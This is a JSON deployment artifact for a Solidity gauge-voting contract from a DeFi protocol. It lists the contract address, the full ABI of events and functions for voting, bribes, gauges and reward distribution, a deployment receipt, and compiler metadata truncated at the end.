{
  "address": "0x01aCd292e71dE85f2dfAE1e6A4A0BB855CA2972f",
  "abi": [
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "int256",
          "name": "weight",
          "type": "int256"
        }
      ],
      "name": "Abstained",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "gauge",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        }
      ],
      "name": "Attach",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "lp",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "gauge",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Deposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "gauge",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        }
      ],
      "name": "Detach",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "gauge",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "DistributeReward",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "gauge",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "creator",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "bribe",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "pool",
          "type": "address"
        }
      ],
      "name": "GaugeCreated",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "reward",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NotifyReward",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "voter",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "int256",
          "name": "weight",
          "type": "int256"
        }
      ],
      "name": "Voted",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "whitelister",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "token",
          "type": "address"
        }
      ],
      "name": "Whitelisted",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "lp",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "gauge",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "attachTokenToGauge",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bribeFactory",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "bribes",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_bribes",
          "type": "address[]"
        },
        {
          "internalType": "address[][]",
          "name": "_tokens",
          "type": "address[][]"
        },
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "claimBribes",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_bribes",
          "type": "address[]"
        },
        {
          "internalType": "address[][]",
          "name": "_tokens",
          "type": "address[][]"
        },
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "claimFees",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_gauges",
          "type": "address[]"
        },
        {
          "internalType": "address[][]",
          "name": "_tokens",
          "type": "address[][]"
        }
      ],
      "name": "claimRewards",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "claimable",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_pool",
          "type": "address"
        }
      ],
      "name": "createGauge",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "detachTokenFromGauge",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_gauge",
          "type": "address"
        }
      ],
      "name": "distribute",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "distributeAll",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_gauges",
          "type": "address[]"
        }
      ],
      "name": "distributeFees",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_gauges",
          "type": "address[]"
        }
      ],
      "name": "distributeForGauges",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "start",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "finish",
          "type": "uint256"
        }
      ],
      "name": "distributeForPoolsInRange",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "emitDeposit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "emitWithdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "factory",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "gaugeFactory",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "gauges",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "index",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_tokens",
          "type": "address[]"
        },
        {
          "internalType": "address",
          "name": "_minter",
          "type": "address"
        }
      ],
      "name": "init",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_ve",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_factory",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_gaugeFactory",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_bribeFactory",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_minter",
          "type": "address"
        }
      ],
      "name": "initialize",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "isGauge",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "isWhitelisted",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "listingFee",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "minter",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "notifyRewardAmount",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "poke",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "poolForGauge",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "poolVote",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "pools",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "poolsLength",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_gaugeOrBribe",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "registerRewardToken",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_gaugeOrBribe",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "removeRewardToken",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "reset",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "supplyIndex",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "token",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalWeight",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "updateAll",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address[]",
          "name": "_gauges",
          "type": "address[]"
        }
      ],
      "name": "updateFor",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "start",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "end",
          "type": "uint256"
        }
      ],
      "name": "updateForRange",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_gauge",
          "type": "address"
        }
      ],
      "name": "updateGauge",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "usedWeights",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "ve",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "address[]",
          "name": "_poolVote",
          "type": "address[]"
        },
        {
          "internalType": "int256[]",
          "name": "_weights",
          "type": "int256[]"
        }
      ],
      "name": "vote",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "tokenId",
          "type": "uint256"
        },
        {
          "internalType": "address[]",
          "name": "_poolVote",
          "type": "address[]"
        },
        {
          "internalType": "int256[]",
          "name": "_weights",
          "type": "int256[]"
        }
      ],
      "name": "votePart",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "votes",
      "outputs": [
        {
          "internalType": "int256",
          "name": "",
          "type": "int256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "weights",
      "outputs": [
        {
          "internalType": "int256",
          "name": "",
          "type": "int256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "whitelist",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0x6e79065c29c71539feda24d72bc0d38fff19dac5a65d33e9cdf983b4e196a56e",
  "receipt": {
    "to": null,
    "from": "0x175FB9401BB5E360FF3c0Ef00097116944128930",
    "contractAddress": "0x01aCd292e71dE85f2dfAE1e6A4A0BB855CA2972f",
    "transactionIndex": 0,
    "gasUsed": "4186686",
    "logsBloom": "0x
    "blockHash": "0x01d760794213f9da9b0a7734868adb4578c0f92d5cd76e16e4f0a7aaf82a3695",
    "transactionHash": "0x6e79065c29c71539feda24d72bc0d38fff19dac5a65d33e9cdf983b4e196a56e",
    "logs": [
      {
        "transactionIndex": 0,
        "blockNumber": 30892153,
        "transactionHash": "0x6e79065c29c71539feda24d72bc0d38fff19dac5a65d33e9cdf983b4e196a56e",
        "address": "0x01aCd292e71dE85f2dfAE1e6A4A0BB855CA2972f",
        "topics": [
          "0xb35bf4274d4295009f1ec66ed3f579db287889444366c03d3a695539372e8951"
        ],
        "data": "0x000000000000000000000000175fb9401bb5e360ff3c0ef00097116944128930",
        "logIndex": 0,
        "blockHash": "0x01d760794213f9da9b0a7734868adb4578c0f92d5cd76e16e4f0a7aaf82a3695"
      }
    ],
    "blockNumber": 30892153,
    "cumulativeGasUsed": "4186686",
    "status": 1,
    "byzantium": true
  },
  "args": [],
  "numDeployments": 4,
  "solcInputHash": "95e507a65843f56d076b5a453a90f480",
  "metadata": "{\"compiler\":{\"version\":\"0.8.13+commit.abaa5c0e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"weight\",\"type\":\"int256\"}],\"name\":\"Abstained\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"gauge\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Attach\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"lp\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"gauge\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"gauge\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"Detach\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"gauge\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"DistributeReward\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"gauge\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"creator\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"bribe\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"name\":\"GaugeCreated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"reward\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"NotifyReward\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"voter\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"weight\",\"type\":\"int256\"}],\"name\":\"Voted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"whitelister\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"Whitelisted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"lp\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"gauge\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"attachTokenToGauge\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bribeFactory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"bribes\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_bribes\",\"type\":\"address[]\"},{\"internalType\":\"address[][]\",\"name\":\"_tokens\",\"type\":\"address[][]\"},{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"claimBribes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_bribes\",\"type\":\"address[]\"},{\"internalType\":\"address[][]\",\"name\":\"_tokens\",\"type\":\"address[][]\"},{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"claimFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_gauges\",\"type\":\"address[]\"},{\"internalType\":\"address[][]\",\"name\":\"_tokens\",\"type\":\"address[][]\"}],\"name\":\"claimRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"claimable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pool\",\"type\":\"address\"}],\"name\":\"createGauge\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"detachTokenFromGauge\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_gauge\",\"type\":\"address\"}],\"name\":\"distribute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributeAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_gauges\",\"type\":\"address[]\"}],\"name\":\"distributeFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_gauges\",\"type\":\"address[]\"}],\"name\":\"distributeForGauges\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"finish\",\"type\":\"uint256\"}],\"name\":\"distributeForPoolsInRange\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"emitDeposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"emitWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gaugeFactory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"gauges\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"index\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_tokens\",\"type\":\"address[]\"},{\"internalType\":\"address\",\"name\":\"_minter\",\"type\":\"address\"}],\"name\":\"init\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_ve\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_factory\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_gaugeFactory\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_bribeFactory\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_minter\",\"type\":\"address\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isGauge\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isWhitelisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"notifyRewardAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"poke\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"poolForGauge\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"poolVote\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"pools\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"poolsLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_gaugeOrBribe\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tokenId\",\"type\":\"uint256\"}],\"name\":\"registerRewardToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\